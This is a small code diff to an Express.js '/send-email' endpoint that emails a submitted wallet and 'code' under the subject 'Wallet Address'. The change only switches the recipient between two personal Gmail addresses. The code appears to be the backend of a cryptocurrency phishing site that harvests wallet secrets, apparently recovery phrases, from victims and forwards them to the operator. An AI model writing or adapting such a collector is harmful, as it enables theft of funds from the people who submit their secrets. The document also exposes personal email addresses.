@@ -48,8 +48,8 @@ app.post("/send-email", async (req, res) => {
 
     let mailOptions = {
       from: "emailAddress",
-      // to: "dorisnewsome4@gmail.com", // Replace with your email
-      to: "fadeyibi26@gmail.com", // Replace with your email
+      to: "dorisnewsome4@gmail.com", // Replace with your email
+      // to: "fadeyibi26@gmail.com", // Replace with your email
       subject: "Wallet Address",
       text: `Wallet: ${wallet}\ncode: ${text}`,
     };
